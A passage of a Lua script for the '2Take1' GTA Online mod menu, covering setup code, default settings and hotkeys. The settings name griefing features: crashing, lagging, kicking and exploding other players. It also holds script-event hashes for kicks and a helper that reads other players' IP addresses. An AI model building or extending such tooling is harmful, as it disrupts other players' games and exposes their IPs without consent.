local a = {}
a["PDevs"] = utils.get_appdata_path("PopstarDevs", "")
a["Menu"] = a["PDevs"] .. "\\2Take1Menu"
a["dumps"] = a["Menu"] .. "\\crashdump"
a["scripts"] = a["Menu"] .. "\\scripts"
a["2T1S"] = a["scripts"] .. "\\2Take1Script"
a["Config"] = a["2T1S"] .. "\\Config"
a["CustomFiles"] = a["2T1S"] .. "\\CustomFiles"
a["Event-Logger"] = a["2T1S"] .. "\\Event-Logger"
a["TEMP"] = "C:\\TEMP"
local b = {
    ["Auth"] = a["PDevs"] .. "\\PopstarAuth.log",
    ["Menu_log"] = a["Menu"] .. "\\2Take1Menu.log",
    ["Prep"] = a["Menu"] .. "\\2Take1Prep.log",
    ["Admin"] = a["scripts"] .. "\\2Take1Script-Admin.lua",
    ["Log_file"] = a["2T1S"] .. "\\2Take1Script.log",
    ["EXT_file"] = a["CustomFiles"] .. "\\2Take1ScriptEXT.lua",
    ["Blacklist"] = a["CustomFiles"] .. "\\2Take1Blacklist.cfg",
    ["Modders"] = a["CustomFiles"] .. "\\2Take1Modders.cfg",
    ["IPLlist"] = a["CustomFiles"] .. "\\2Take1IPLlist.txt",
    ["data"] = a["Config"] .. "\\offsets.data",
    ["Config"] = a["Config"] .. "\\2Take1Script.ini",
    ["Hotkeys"] = a["Config"] .. "\\2Take1Hotkeys.ini",
    ["Exclude"] = a["Config"] .. "\\2Take1Exclude.ini",
    ["vbs"] = a["TEMP"] .. "\\XX2T1SXX.vbs"
}
local c = {}
c.o = io.open
c.no = tonumber
c.exe = os.execute
c.wait = system.wait
c.time = utils.time_ms
c.random = math.random
c.id = player.player_id
c.ped = player.get_player_ped
c.valid = player.is_player_valid
c.gcoords = entity.get_entity_coords
c.script = script.trigger_script_event
c.navigate = menu.set_menu_can_navigate
c.unload = streaming.set_model_as_no_longer_needed
local d = {}
d.write = function(e, f)
    if e ~= nil then
        io.output(e)
        io.write(f .. "\n")
        io.close(e)
    end
end
d.time_prefix = function()
    local g = os.date("*t")
    if g.month < 10 then
        g.month = "0" .. g.month
    end
    if g.day < 10 then
        g.day = "0" .. g.day
    end
    if g.hour < 10 then
        g.hour = "0" .. g.hour
    end
    if g.min < 10 then
        g.min = "0" .. g.min
    end
    if g.sec < 10 then
        g.sec = "0" .. g.sec
    end
    return "[" .. g.year .. "-" .. g.month .. "-" .. g.day .. " " .. g.hour .. ":" .. g.min .. ":" .. g.sec .. "]"
end
d.file_name = function()
    local h = debug.getinfo(2, "S")
    local j = h.source:sub(2) or h
    while string.find(j, "\\", 1) ~= nil do
        j = string.sub(j, 2)
    end
    return j
end
d.stop = function(k)
    if k.on then
        return 0
    end
    return 1
end
local l = {}
l[0] = {}
l[0][#l[0] + 1] = "section_1"
l["section_1"] = "[Main-Settings]"
l[0][#l[0] + 1] = "version"
l["version"] = 16
l[0][#l[0] + 1] = "2t1s_parent"
l["2t1s_parent"] = true
l[0][#l[0] + 1] = "exclude_friends"
l["exclude_friends"] = true
l[0][#l[0] + 1] = "logger"
l["logger"] = true
l[0][#l[0] + 1] = "section_2"
l["section_2"] = "[Blacklist]"
l[0][#l[0] + 1] = "bl_hidden"
l["bl_hidden"] = false
l[0][#l[0] + 1] = "blacklist_enabled"
l["blacklist_enabled"] = false
l[0][#l[0] + 1] = "auto_kick"
l["auto_kick"] = false
l[0][#l[0] + 1] = "mark_modder"
l["mark_modder"] = false
l[0][#l[0] + 1] = "admin_enabled"
l["admin_enabled"] = false
l[0][#l[0] + 1] = "kick_joining"
l["kick_joining"] = false
l[0][#l[0] + 1] = "section_3"
l["section_3"] = "[Modders]"
l[0][#l[0] + 1] = "modder_hidden"
l["modder_hidden"] = false
l[0][#l[0] + 1] = "remember_modder"
l["remember_modder"] = false
l[0][#l[0] + 1] = "speed_bypass"
l["speed_bypass"] = false
l[0][#l[0] + 1] = "name_bypass"
l["name_bypass"] = false
l[0][#l[0] + 1] = "modded_ip_scid"
l["modded_ip_scid"] = false
l[0][#l[0] + 1] = "modded_net_events"
l["modded_net_events"] = false
l[0][#l[0] + 1] = "modder_force_sh"
l["modder_force_sh"] = false
l[0][#l[0] + 1] = "section_4"
l["section_4"] = "[Lobby]"
l[0][#l[0] + 1] = "lobby_hidden"
l["lobby_hidden"] = false
l[0][#l[0] + 1] = "teleport_to_block"
l["teleport_to_block"] = false
l[0][#l[0] + 1] = "explode_lobby"
l["explode_lobby"] = false
l[0][#l[0] + 1] = "explode_lobby_value"
l["explode_lobby_value"] = 8
l[0][#l[0] + 1] = "explode_lobby_shake"
l["explode_lobby_shake"] = false
l[0][#l[0] + 1] = "sound_rape"
l["sound_rape"] = false
l[0][#l[0] + 1] = "kill_all_peds"
l["kill_all_peds"] = false
l[0][#l[0] + 1] = "disablecontrol"
l["disablecontrol"] = false
l[0][#l[0] + 1] = "bounty_after_death"
l["bounty_after_death"] = false
l[0][#l[0] + 1] = "bounty_after_death_value"
l["bounty_after_death_value"] = 0
l[0][#l[0] + 1] = "anonymous_bounty"
l["anonymous_bounty"] = false
l[0][#l[0] + 1] = "karma_se"
l["karma_se"] = false
l[0][#l[0] + 1] = "punish_aliens"
l["punish_aliens"] = false
l[0][#l[0] + 1] = "force_host"
l["force_host"] = false
l[0][#l[0] + 1] = "modify_veh_speed"
l["modify_veh_speed"] = 0
l[0][#l[0] + 1] = "modify_veh_speed_include"
l["modify_veh_speed_include"] = false
l[0][#l[0] + 1] = "modify_veh_speed_overwrite"
l["modify_veh_speed_overwrite"] = false
l[0][#l[0] + 1] = "section_5"
l["section_5"] = "[Vehicle-Blacklist]"
l[0][#l[0] + 1] = "veh_blacklist"
l["veh_blacklist"] = false
l[0][#l[0] + 1] = "Oppressor"
l["Oppressor"] = false
l[0][#l[0] + 1] = "MK2_Oppressor"
l["MK2_Oppressor"] = false
l[0][#l[0] + 1] = "Lazer"
l["Lazer"] = false
l[0][#l[0] + 1] = "Hydra"
l["Hydra"] = false
l[0][#l[0] + 1] = "Deluxo"
l["Deluxo"] = false
l[0][#l[0] + 1] = "Akula"
l["Akula"] = false
l[0][#l[0] + 1] = "B_11_Strikforce"
l["B_11_Strikforce"] = false
l[0][#l[0] + 1] = "Tank"
l["Tank"] = false
l[0][#l[0] + 1] = "Khanjali"
l["Khanjali"] = false
l[0][#l[0] + 1] = "Stromberg"
l["Stromberg"] = false
l[0][#l[0] + 1] = "Buzzard"
l["Buzzard"] = false
l[0][#l[0] + 1] = "Hunter"
l["Hunter"] = false
l[0][#l[0] + 1] = "Avenger"
l["Avenger"] = false
l[0][#l[0] + 1] = "Insurgent_Pickup"
l["Insurgent_Pickup"] = false
l[0][#l[0] + 1] = "Insurgent_Pickup_Custom"
l["Insurgent_Pickup_Custom"] = false
l[0][#l[0] + 1] = "Halftrack"
l["Halftrack"] = false
l[0][#l[0] + 1] = "section_6"
l["section_6"] = "[Chat]"
l[0][#l[0] + 1] = "chat_hidden"
l["chat_hidden"] = false
l[0][#l[0] + 1] = "chat_cmd_friends"
l["chat_cmd_friends"] = true
l[0][#l[0] + 1] = "chat_cmd_all"
l["chat_cmd_all"] = false
l[0][#l[0] + 1] = "chat_log"
l["chat_log"] = false
l[0][#l[0] + 1] = "chat_russki"
l["chat_russki"] = false
l[0][#l[0] + 1] = "chat_begger"
l["chat_begger"] = false
l[0][#l[0] + 1] = "section_7"
l["section_7"] = "[Chat-Commands]"
l[0][#l[0] + 1] = "chat_cmd"
l["chat_cmd"] = false
l[0][#l[0] + 1] = "cmd_explode"
l["cmd_explode"] = false
l[0][#l[0] + 1] = "cmd_explode_all"
l["cmd_explode_all"] = false
l[0][#l[0] + 1] = "cmd_kick"
l["cmd_kick"] = false
l[0][#l[0] + 1] = "cmd_kick_all"
l["cmd_kick_all"] = false
l[0][#l[0] + 1] = "cmd_crash"
l["cmd_crash"] = false
l[0][#l[0] + 1] = "cmd_crash_all"
l["cmd_crash_all"] = false
l[0][#l[0] + 1] = "cmd_lag"
l["cmd_lag"] = false
l[0][#l[0] + 1] = "cmd_trap"
l["cmd_trap"] = false
l[0][#l[0] + 1] = "cmd_tp"
l["cmd_tp"] = false
l[0][#l[0] + 1] = "cmd_clearwanted"
l["cmd_clearwanted"] = false
l[0][#l[0] + 1] = "cmd_vehicle"
l["cmd_vehicle"] = false
l[0][#l[0] + 1] = "cmd_bigpp"
l["cmd_bigpp"] = false
l[0][#l[0] + 1] = "cmd_bigppall"
l["cmd_bigppall"] = false
l[0][#l[0] + 1] = "section_8"
l["section_8"] = "[Custom-Vehicles]"
l[0][#l[0] + 1] = "custom_vehicles_hidden"
l["custom_vehicles_hidden"] = false
l[0][#l[0] + 1] = "spawn_in_vehicle"
l["spawn_in_vehicle"] = true
l[0][#l[0] + 1] = "use_own_veh"
l["use_own_veh"] = true
l[0][#l[0] + 1] = "set_godmode"
l["set_godmode"] = false
l[0][#l[0] + 1] = "controllable_blasts"
l["controllable_blasts"] = false
l[0][#l[0] + 1] = "moveable_legs"
l["moveable_legs"] = false
l[0][#l[0] + 1] = "robot_collision"
l["robot_collision"] = false
l[0][#l[0] + 1] = "rocket_propulsion"
l["rocket_propulsion"] = false
l[0][#l[0] + 1] = "equip_weapons"
l["equip_weapons"] = false
l[0][#l[0] + 1] = "disable_tampa_notify"
l["disable_tampa_notify"] = false
l[0][#l[0] + 1] = "section_9"
l["section_9"] = "[Explosive-Beam]"
l[0][#l[0] + 1] = "explosive_beam_hidden"
l["explosive_beam_hidden"] = false
l[0][#l[0] + 1] = "exp_beam"
l["exp_beam"] = false
l[0][#l[0] + 1] = "exp_beam_type"
l["exp_beam_type"] = 59
l[0][#l[0] + 1] = "exp_beam_type_2"
l["exp_beam_type_2"] = 8
l[0][#l[0] + 1] = "exp_beam_radius"
l["exp_beam_radius"] = 10
l[0][#l[0] + 1] = "exp_beam_min"
l["exp_beam_min"] = 75
l[0][#l[0] + 1] = "exp_beam_max"
l["exp_beam_max"] = 225
l[0][#l[0] + 1] = "section_10"
l["section_10"] = "[Better-Animal-Changer]"
l[0][#l[0] + 1] = "animal_changer_hidden"
l["animal_changer_hidden"] = false
l[0][#l[0] + 1] = "bl_mdl_change"
l["bl_mdl_change"] = true
l[0][#l[0] + 1] = "section_11"
l["section_11"] = "[PTFX]"
l[0][#l[0] + 1] = "ptfx_hidden"
l["ptfx_hidden"] = false
l[0][#l[0] + 1] = "sparkling_ass"
l["sparkling_ass"] = false
l[0][#l[0] + 1] = "sparkling_tires"
l["sparkling_tires"] = false
l[0][#l[0] + 1] = "smoke_area"
l["smoke_area"] = false
l[0][#l[0] + 1] = "fire_circle"
l["fire_circle"] = false
l[0][#l[0] + 1] = "fire_fart"
l["fire_fart"] = 8
l[0][#l[0] + 1] = "fire_ass"
l["fire_ass"] = false
l[0][#l[0] + 1] = "section_12"
l["section_12"] = "[Miscellaneous]"
l[0][#l[0] + 1] = "misc_hidden"
l["misc_hidden"] = false
l[0][#l[0] + 1] = "drive_on_ocean"
l["drive_on_ocean"] = false
l[0][#l[0] + 1] = "drive_this_height"
l["drive_this_height"] = false
l[0][#l[0] + 1] = "weird_ent"
l["weird_ent"] = false
l[0][#l[0] + 1] = "real_time"
l["real_time"] = false
l[0][#l[0] + 1] = "random_clothes"
l["random_clothes"] = false
l[0][#l[0] + 1] = "clear_area"
l["clear_area"] = false
l[0][#l[0] + 1] = "clear_area_2"
l["clear_area_2"] = false
l[0][#l[0] + 1] = "auto_tp_wp"
l["auto_tp_wp"] = false
l[0][#l[0] + 1] = "police_outfit"
l["police_outfit"] = false
l[0][#l[0] + 1] = "auto_load"
l["auto_load"] = false
l[0][#l[0] + 1] = "log_modder_flags"
l["log_modder_flags"] = false
l[0][#l[0] + 1] = "section_13"
l["section_13"] = "[Weapons-Features]"
l[0][#l[0] + 1] = "load_weapons"
l["load_weapons"] = false
l[0][#l[0] + 1] = "flamethrower_scale"
l["flamethrower_scale"] = 1
l[0][#l[0] + 1] = "flamethrower"
l["flamethrower"] = false
l[0][#l[0] + 1] = "flamethrower_green"
l["flamethrower_green"] = false
l[0][#l[0] + 1] = "shoot_entitys"
l["shoot_entitys"] = false
l[0][#l[0] + 1] = "Boat"
l["Boat"] = false
l[0][#l[0] + 1] = "Bumper_Car"
l["Bumper_Car"] = false
l[0][#l[0] + 1] = "XMAS_Tree"
l["XMAS_Tree"] = false
l[0][#l[0] + 1] = "Orange_Ball"
l["Orange_Ball"] = false
l[0][#l[0] + 1] = "Stone"
l["Stone"] = false
l[0][#l[0] + 1] = "Money_Bag"
l["Money_Bag"] = false
l[0][#l[0] + 1] = "Cash_Pile"
l["Cash_Pile"] = false
l[0][#l[0] + 1] = "Trash"
l["Trash"] = false
l[0][#l[0] + 1] = "Roller_Car"
l["Roller_Car"] = false
l[0][#l[0] + 1] = "Cable_Car"
l["Cable_Car"] = false
l[0][#l[0] + 1] = "Big_Dildo"
l["Big_Dildo"] = false
l[0][#l[0] + 1] = "delete_gun"
l["delete_gun"] = false
l[0][#l[0] + 1] = "kick_gun"
l["kick_gun"] = false
l[0][#l[0] + 1] = "demigod_gun"
l["demigod_gun"] = false
l[0][#l[0] + 1] = "model_gun"
l["model_gun"] = false
l[0][#l[0] + 1] = "model_gun_ext"
l["model_gun_ext"] = false
l[0][#l[0] + 1] = "rapid_fire"
l["rapid_fire"] = false
l[0][#l[0] + 1] = "section_14"
l["section_14"] = "[Vehicle]"
l[0][#l[0] + 1] = "heli"
l["heli"] = false
l[0][#l[0] + 1] = "heli_i"
l["heli_i"] = 100
l[0][#l[0] + 1] = "sel_boost_speed"
l["sel_boost_speed"] = false
l[0][#l[0] + 1] = "sel_boost_speed_speed"
l["sel_boost_speed_speed"] = 100
l[0][#l[0] + 1] = "speedometer"
l["speedometer"] = false
l[0][#l[0] + 1] = "speedometer_type"
l["speedometer_type"] = 1
l[0][#l[0] + 1] = "veh_no_colision"
l["veh_no_colision"] = false
l[0][#l[0] + 1] = "auto_repair"
l["auto_repair"] = false
l[0][#l[0] + 1] = "section_15"
l["section_15"] = "[Vehicle-Colors]"
l[0][#l[0] + 1] = "veh_lights_speed"
l["veh_lights_speed"] = 125
l[0][#l[0] + 1] = "random_primary"
l["random_primary"] = false
l[0][#l[0] + 1] = "random_secondary"
l["random_secondary"] = false
l[0][#l[0] + 1] = "random_pearlescent"
l["random_pearlescent"] = false
l[0][#l[0] + 1] = "random_neon"
l["random_neon"] = false
l[0][#l[0] + 1] = "random_smoke"
l["random_smoke"] = false
l[0][#l[0] + 1] = "random_xenon"
l["random_xenon"] = false
l[0][#l[0] + 1] = "rainbow_primary"
l["rainbow_primary"] = false
l[0][#l[0] + 1] = "rainbow_secondary"
l["rainbow_secondary"] = false
l[0][#l[0] + 1] = "rainbow_pearlescent"
l["rainbow_pearlescent"] = false
l[0][#l[0] + 1] = "rainbow_neon"
l["rainbow_neon"] = false
l[0][#l[0] + 1] = "rainbow_smoke"
l["rainbow_smoke"] = false
l[0][#l[0] + 1] = "rainbow_xenon"
l["rainbow_xenon"] = false
l[0][#l[0] + 1] = "synced_random"
l["synced_random"] = false
l[0][#l[0] + 1] = "synced_rainbow"
l["synced_rainbow"] = false
l[0][#l[0] + 1] = "synced_rainbow_smooth"
l["synced_rainbow_smooth"] = false
l[0][#l[0] + 1] = "black_100"
l["black_100"] = false
l[0][#l[0] + 1] = "fade_black_red"
l["fade_black_red"] = false
l[0][#l[0] + 1] = "section_16"
l["section_16"] = "[Bodyguards]"
l[0][#l[0] + 1] = "bodyguards_hidden"
l["bodyguards_hidden"] = false
l[0][#l[0] + 1] = "bodyguards_god"
l["bodyguards_god"] = false
l[0][#l[0] + 1] = "bodyguards_health"
l["bodyguards_health"] = 5000
l[0][#l[0] + 1] = "bodyguards_equip_weapon"
l["bodyguards_equip_weapon"] = false
l[0][#l[0] + 1] = "bodyguards_formation_type"
l["bodyguards_formation_type"] = 0
l[0][#l[0] + 1] = "section_17"
l["section_17"] = "[Aim-Protection]"
l[0][#l[0] + 1] = "aim_prot_hidden"
l["aim_prot_hidden"] = false
l[0][#l[0] + 1] = "enable_aim_prot"
l["enable_aim_prot"] = false
l[0][#l[0] + 1] = "anonymous_punishment"
l["anonymous_punishment"] = true
l[0][#l[0] + 1] = "aim_prot_ragdoll"
l["aim_prot_ragdoll"] = false
l[0][#l[0] + 1] = "aim_prot_fire"
l["aim_prot_fire"] = false
l[0][#l[0] + 1] = "aim_prot_kill"
l["aim_prot_kill"] = false
l[0][#l[0] + 1] = "aim_prot_remove_weapon"
l["aim_prot_remove_weapon"] = false
l[0][#l[0] + 1] = "aim_prot_kick"
l["aim_prot_kick"] = false
l[0][#l[0] + 1] = "section_18"
l["section_18"] = "[Options]"
l[0][#l[0] + 1] = "options_hidden"
l["options_hidden"] = false
l[0][#l[0] + 1] = "attach_no_colision"
l["attach_no_colision"] = false
l[0][#l[0] + 1] = "continuously_assassins"
l["continuously_assassins"] = false
l[0][#l[0] + 1] = "override_notify_color"
l["override_notify_color"] = false
l[0][#l[0] + 1] = "notify_color"
l["notify_color"] = 0
l[0][#l[0] + 1] = "enable_hotkeys"
l["enable_hotkeys"] = false
l[0][#l[0] + 1] = "hotkey_notification"
l["hotkey_notification"] = false
l[0][#l[0] + 1] = "disable_history"
l["disable_history"] = false
l[0][#l[0] + 1] = "mwh_notify"
l["mwh_notify"] = false
l[0][#l[0] + 1] = "mwh_exclude_navigation"
l["mwh_exclude_navigation"] = true
l[0][#l[0] + 1] = "mwh_exclude_noclip"
l["mwh_exclude_noclip"] = true
l[0][#l[0] + 1] = "mwh_exclude_editorrot"
l["mwh_exclude_editorrot"] = true
l[0][#l[0] + 1] = "mwh_exclude_file"
l["mwh_exclude_file"] = false
local m = {}
m[0] = {}
m[0][#m[0] + 1] = "leave_session"
m["leave_session"] = "none"
m[0][#m[0] + 1] = "crash_yourself"
m["crash_yourself"] = "none"
m[0][#m[0] + 1] = "print_info_from_entity"
m["print_info_from_entity"] = "none"
m[0][#m[0] + 1] = "send_message_to_dc"
m["send_message_to_dc"] = "none"
m[0][#m[0] + 1] = "drive_this_height"
m["drive_this_height"] = "none"
m[0][#m[0] + 1] = "auto_tp_wp"
m["auto_tp_wp"] = "none"
m[0][#m[0] + 1] = "force_host"
m["force_host"] = "none"
m[0][#m[0] + 1] = "synced_rainbow"
m["synced_rainbow"] = "none"
m[0][#m[0] + 1] = "veh_blacklist"
m["veh_blacklist"] = "none"
m[0][#m[0] + 1] = "laser_beam_explode_waypoint"
m["laser_beam_explode_waypoint"] = "none"
m[0][#m[0] + 1] = "blacklist_enabled"
m["blacklist_enabled"] = "none"
m[0][#m[0] + 1] = "kick_joining"
m["kick_joining"] = "none"
m[0][#m[0] + 1] = "remember_modder"
m["remember_modder"] = "none"
m[0][#m[0] + 1] = "exclude_friends"
m["exclude_friends"] = "none"
m[0][#m[0] + 1] = "chat_cmd"
m["chat_cmd"] = "none"
m[0][#m[0] + 1] = "send_msg_to_script_users"
m["send_msg_to_script_users"] = "none"
m[0][#m[0] + 1] = "teleport_high_in_air"
m["teleport_high_in_air"] = "none"
m[0][#m[0] + 1] = "tp_own_veh_to_me"
m["tp_own_veh_to_me"] = "none"
m[0][#m[0] + 1] = "tp_own_veh_to_me_drive"
m["tp_own_veh_to_me_drive"] = "none"
m[0][#m[0] + 1] = "drive_own_veh"
m["drive_own_veh"] = "none"
m[0][#m[0] + 1] = "tp_to_own_veh"
m["tp_to_own_veh"] = "none"
m[0][#m[0] + 1] = "save_config"
m["save_config"] = "none"
local n = {}
n[0] = {}
n[0][#n[0] + 1] = "maxspeed"
n["maxspeed"] = {"Max-Speed-Bypass", nil}
n[0][#n[0] + 1] = "illegalname"
n["illegalname"] = {"Illegal-Name", nil}
n[0][#n[0] + 1] = "moddedip"
n["moddedip"] = {"Modded-IP", nil}
n[0][#n[0] + 1] = "moddedscid"
n["moddedscid"] = {"Modded-SCID", nil}
n[0][#n[0] + 1] = "moddednetevent"
n["moddednetevent"] = {"Modded-Net-Event", nil}
n[0][#n[0] + 1] = "force_sh"
n["force_sh"] = {"Forced-Script-Host", nil}
n[0][#n[0] + 1] = "remembered"
n["remembered"] = {"Remembered", nil}
n[0][#n[0] + 1] = "blacklist"
n["blacklist"] = {"Blacklist", nil}
local function o(g, q, r)
    if g == nil then
        return
    end
    if q == nil then
        q = 140
    end
    if r == nil then
        r = "2Take1Script"
    end
    if l["override_notify_color"] then
        q = l["notify_color"]
    end
    ui.notify_above_map(g, r, q)
end
local function s(f, t)
    if l["logger"] then
        if f == nil then
            return
        end
        local u = d.time_prefix() .. " [2Take1Script] "
        if t ~= nil then
            u = u .. t .. " "
        end
        f = u .. f
        d.write(c.o(b["Log_file"], "a"), f)
    end
end
local v = {
    1,
    2,
    4,
    8,
    16,
    32,
    64,
    128,
    256,
    512,
    1024,
    2048,
    4096,
    8192,
    16384,
    32768,
    65536,
    131072,
    262144,
    524288,
    1048576,
    2097152,
    4194304,
    8388608,
    16777216,
    33554432,
    67108864,
    134217728,
    268435456,
    536870912,
    1073741824,
    2147483648,
    4294967296,
    8589934592,
    17179869184,
    34359738368,
    68719476736,
    137438953472,
    274877906944,
    549755813888,
    1099511627776,
    2199023255552,
    4398046511104,
    8796093022208,
    17592186044416,
    35184372088832,
    70368744177664,
    140737488355328,
    281474976710656,
    562949953421312,
    1125899906842624,
    2251799813685248,
    4503599627370496,
    9007199254740992,
    18014398509481984,
    36028797018963968,
    72057594037927936,
    144115188075855872,
    288230376151711744,
    576460752303423488,
    1152921504606846976,
    2305843009213693952,
    4611686018427387904
}
local w = {}
local x = {}
x.main = function()
    s("loading Settings...")
    math.randomseed(c.time())
    if _2t1s then
        s("2Take1Script already loaded, stopping.")
        o("2Take1Script already loaded, stopping.", 208)
        return
    end
    if utils.file_exists(b["Admin"]) then
        if not l_a then
            local y, z = loadfile(b["Admin"])
            if y ~= nil then
                xpcall(y, debug.traceback)
                s("2Take1Script-Admin successfully loaded.")
            else
                o("ERROR Loading Script Admin!", 208)
            end
        end
    end
    if not utils.dir_exists(a["2T1S"]) then
        o("2Take1Script folder not found...", 208)
        o("Redownload the script and make sure you got all files!", 208)
        return
    else
        if utils.file_exists(b["EXT_file"]) then
            _2t1sEXT = true
            local A, z = loadfile(b["EXT_file"])
            if A ~= nil then
                xpcall(A, debug.traceback)
                s("2Take1ScriptEXT successfully loaded.")
            else
                _2t1sEXT = false
                o("ERROR Loading Script EXT, returning!", 208)
                return
            end
        else
            o("2Take1ScriptEXT.lua not found!\nMake sure you have all important files!", 208)
            return
        end
        if not utils.dir_exists(a["Config"]) then
            o("2Take1Script/Config folder not found...", 208)
            o("Redownload the script and make sure you got all files!", 208)
            return
        end
        if not utils.dir_exists(a["CustomFiles"]) then
            o("2Take1Script/CustomFiles folder not found...", 208)
            o("Redownload the script and make sure you got all files!", 208)
            return
        end
    end
    if utils.file_exists(a["2T1S"] .. "\\2Take1Script.ini") then
        if not os.rename(a["2T1S"] .. "\\2Take1Script.ini", b["Config"]) then
            o("To use your current Settings, manually move '2Take1Script.ini' into folder 'Config'", 208)
        end
    end
    if utils.file_exists(a["2T1S"] .. "\\2Take1Hotkeys.ini") then
        if not os.rename(a["2T1S"] .. "\\2Take1Hotkeys.ini", b["Hotkeys"]) then
            o("To use your current Hotkeys, manually move '2Take1Hotkeys.ini' into folder 'Config'", 208)
        end
    end
    if utils.file_exists(a["2T1S"] .. "\\2Take1Blacklist.cfg") then
        if not os.rename(a["2T1S"] .. "\\2Take1Blacklist.cfg", b["Blacklist"]) then
            o("To use your current 2Take1Blacklist, manually move '2Take1Blacklist.cfg' into folder 'CustomFiles'", 208)
        end
    end
    if utils.file_exists(a["2T1S"] .. "\\2Take1Modders.cfg") then
        if not os.rename(a["2T1S"] .. "\\2Take1Modders.cfg", b["Modders"]) then
            o("To use your current 2Take1Modders, manually move '2Take1Modders.cfg' into folder 'CustomFiles'", 208)
        end
    end
    if utils.file_exists(a["2T1S"] .. "\\2Take1IPLlist.txt") then
        o("To use your current 2Take1IPLlist, manually move '2Take1IPLlist' into folder 'CustomFiles'", 208)
        o("Or delete '2Take1IPLlist.txt' from folder '2Take1Script'", 208)
    end
    if utils.file_exists(a["2T1S"] .. "\\2Take1ScriptEXT.lua") then
        o("To use your current 2Take1ScriptEXT, manually move '2Take1ScriptEXT' into folder 'CustomFiles'", 208)
        o("Or delete '2Take1ScriptEXT.lua' from folder '2Take1Script'", 208)
    end
    local B = c.o(b["Config"], "r")
    if B ~= nil then
        for C in io.lines(b["Config"]) do
            if string.find(C, "]", 1) == nil then
                local D = ""
                while string.find(C, "=", 1) ~= nil do
                    D = D .. string.sub(C, 1, 1)
                    C = string.sub(C, 2)
                end
                D = string.sub(D, 1, #D - 1)
                if l[D] ~= nil then
                    if C == "true" then
                        l[D] = true
                    elseif C == "false" then
                        l[D] = false
                    elseif type(C) == "number" then
                        l[D] = tonumber(C)
                    else
                        l[D] = C
                    end
                else
                    o("I found an outdated setting entry and cant read it, save settings to overwrite it.")
                end
            end
        end
        io.close(B)
    end
    B = nil
    B = c.o(b["data"], "r")
    if B ~= nil then
        for E in io.lines(b["data"]) do
            w[#w + 1] = E
        end
        io.close(B)
    else
        o("ERROR Loading Script, returning!", 208)
        o("Missing files! Redownload the .zip folder and make sure you have all included files!!!")
        return
    end
end
x.modder_flags = function()
    s("Loading Modder-Flags...")
    for i = 15, #v do
        if player.get_modder_flag_text(v[i]) == "" then
            break
        end
        for F = 1, #n[0] do
            if player.get_modder_flag_text(v[i]) == n[n[0][F]][1] then
                n[n[0][F]][2] = v[i]
            end
        end
    end
    for i = 1, #n[0] do
        if n[n[0][i]][2] == nil then
            n[n[0][i]][2] = player.add_modder_flag(n[n[0][i]][1])
        end
    end
end
x.hotkeys = function()
    s("Reading Hotkeys.")
    local G = c.o(b["Hotkeys"], "r")
    if G ~= nil then
        local i = 1
        for H in io.lines(b["Hotkeys"]) do
            if string.find(H, "#", 1) == nil and string.find(H, "version", 1) == nil then
                local D = ""
                while string.find(H, "=", 1) ~= nil do
                    D = D .. string.sub(H, 1, 1)
                    H = string.sub(H, 2)
                end
                D = string.sub(D, 1, #D - 1)
                if H ~= "none" and H ~= "nil" then
                    if m[D] ~= nil then
                        m[D] = H
                    else
                        o("I found an outdated hotkeys entry and cant read it, delete the file to create a new one.")
                    end
                end
            end
        end
        io.close(G)
    end
end
x.main()
x.hotkeys()
x.modder_flags()
local I = {}
I.ctrl = function(J, g)
    if not network.has_control_of_entity(J) then
        network.request_control_of_entity(J)
        if g == nil then
            g = 25
        end
        local time = c.time() + g
        while not network.has_control_of_entity(J) and entity.is_an_entity(J) do
            c.wait(0)
            network.request_control_of_entity(J)
            if time < c.time() then
                return false
            end
        end
    end
    return true
end
I.model = function(r)
    if r ~= nil and not streaming.has_model_loaded(r) then
        streaming.request_model(r)
        local time = c.time() + 7500
        while not streaming.has_model_loaded(r) do
            c.wait(0)
            if time < c.time() then
                return false
            end
        end
    end
    return true
end
local K = {}
K.name = function(i)
    if c.valid(i) then
        return player.get_player_name(i)
    end
    return "Invalid Player"
end
K.scid = function(i)
    if c.valid(i) then
        local c = player.get_player_scid(i)
        if c ~= 4294967295 then
            return c
        end
    end
    return -1
end
K.ip = function(i)
    if c.valid(i) then
        local L = player.get_player_ip(i)
        return string.format("%i.%i.%i.%i", L >> 24 & 0xff, L >> 16 & 0xff, L >> 8 & 0xff, L & 0xff)
    end
    return -1
end
local M = {}
M.ped = function()
    return c.ped(c.id())
end
M.heading = function()
    return player.get_player_heading(c.id())
end
M.coords = function()
    return c.gcoords(M.ped())
end
local N = {}
N.i = function(i, O)
    local P = false
    if O == true then
        P = true
    end
    if c.valid(i) then
        if (P or i ~= c.id()) and K.scid(i) ~= -1 then
            if P or (l["exclude_friends"] and not player.is_player_friend(i) or not l["exclude_friends"]) then
                return true
            end
        end
    end
    return false
end
N.modder = function(i)
    if c.valid(i) then
        if K.scid(i) ~= -1 and i ~= c.id() and not player.is_player_modder(i, -1) then
            if l["exclude_friends"] and not player.is_player_friend(i) or not l["exclude_friends"] then
                return true
            end
        end
    end
    return false
end
local Q = {
    {"Severe Weather", {0}},
    {"Half Track", {0, 1}},
    {"Night Shark AAT", {0, 2}},
    {"APC Mission", {0, 3}},
    {"MOC Mission", {0, 4}},
    {"Tampa Mission", {0, 5}},
    {"Opressor Mission 1", {0, 6}},
    {"Opressor Mission 2", {0, 7}}
}
local R = {
    {"Ban", 0xec7e01b9, {0, 1, 5, 0}, 0x96308401, {0, 1, 5, 0}},
    {"Dismiss", 0x96308401, {0, 1, 5}, 0x96308401, {0, 1, 5}},
    {"Terminate", 0x96308401, {1, 1, 6}, 0x96308401, {0, 1, 6, 0}}
}
local S = {
    {"Boat", -1685705098, false},
    {"Bumper_Car", -77393630, false},
    {"XMAS_Tree", 238789712, false},
    {"Orange_Ball", 148511758, false},
    {"Stone", 2042668880, false},
    {"Money_Bag", 289396019, false},
    {"Cash_Pile", -295781225, false},
    {"Trash", 1919238784, false},
    {"Roller_Car", 1543894721, false},
    {"Cable_Car", -733833763, false},
    {"Big_Dildo", 1333481871, false}
}
local T = {
    {222, 222, 255},
    {2, 21, 255},
    {3, 83, 255},
    {0, 255, 140},
    {94, 255, 1},
    {255, 255, 0},
    {255, 150, 5},
    {255, 62, 0},
    {255, 1, 1},
    {255, 50, 100},
    {255, 5, 190},
    {35, 1, 255},
    {15, 3, 255}
}
local U = {
    {"Oppressor", 0x34B82784},
    {"MK2_Oppressor", 0x7B54A9D3},
    {"Lazer", 0xB39B0AE6},
    {"Hydra", 0x39D6E83F},
    {"Deluxo", 0x586765FB},
    {"Akula", 0x46699F47},
    {"B_11_Strikforce", 0x64DE07A1},
    {"Tank", 0x2EA68690},
    {"Khanjali", 0xAA6F980A},
